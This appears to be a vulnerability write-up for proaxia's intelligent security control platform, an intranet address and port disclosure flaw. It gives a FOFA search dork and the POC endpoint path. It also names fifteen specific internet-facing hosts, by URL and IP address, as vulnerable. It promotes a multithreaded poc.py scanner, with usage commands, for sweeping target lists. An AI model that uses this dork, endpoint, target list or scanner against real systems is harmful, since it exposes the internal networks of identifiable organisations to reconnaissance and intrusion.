# The intelligent security control platform has exposed Intranet address and port vulnerabilities

proaxia Information Technology (Beijing) Co., LTD the owning intelligent security control platform has exposed Intranet address and port vulnerabilities. 

Exploit Title: The intelligent security control platform has exposed Intranet address and port vulnerabilities

FoFa Dork: title="智能视频管控平台"

Date: 2nd June, 2022

 Exploit Author: weifn00

 Vendor Homepage:http://www.proaxia.cn/html/web/hxjscp/ruanjianpingtai/zhinenganquanguankongpingtai/index.html

POC:
/smartfactory-alarm/webSocket/getSocketAddr


We collected the URL of the intelligent security control platform web site through FOFA and verified it by POC, and found exposed Intranet address and port vulnerabilities
![image](https://user-images.githubusercontent.com/106726422/171578238-75ee3c14-8128-48ac-bc3d-83b8b21f3c5a.png)
eg:
http://www.syrdszh.com:8000/
http://183.92.78.194:8000/
http://zczzsn.com:8001/
http://60.191.7.116:8000/
http://110.52.60.19:8001/
http://114.255.144.42:8000/
http://114.255.144.46:8000/
http://218.75.213.52:8001/
http://39.129.86.242:8000/
http://113.141.29.138:8000/
http://218.75.97.2:8000/
http://203.93.171.194:8000/
http://116.171.1.153:8000/
http://218.26.211.242:8000/
http://61.157.98.50:8000/

![image](https://user-images.githubusercontent.com/106726422/171580191-18ef76e3-ef6a-4bb4-8de3-d81cc5bfb6de.png)

Of course, if you want to make it easier to use vulnerabilities, you can also use poc.py, which I wrote

    -h --help                   Help document
    -u --url                    The target url
    -f --target_file            File at the destination address
    -r --resutl_file            The output information file address (default: resutl.txt)
    -t --thread_num             Number of threads (default 50)
    -p --proxies                Whether to enable the proxy. The proxy is disabled by default. If you enter the proxy, the proxy is enabled
eg：
    python3 poc.py -u http://www.xxx.com
    python3 poc.py -f target.txt

![1](https://user-images.githubusercontent.com/106726422/171582049-04fb8ce5-f40a-44ae-b155-39f11071047f.png)

    
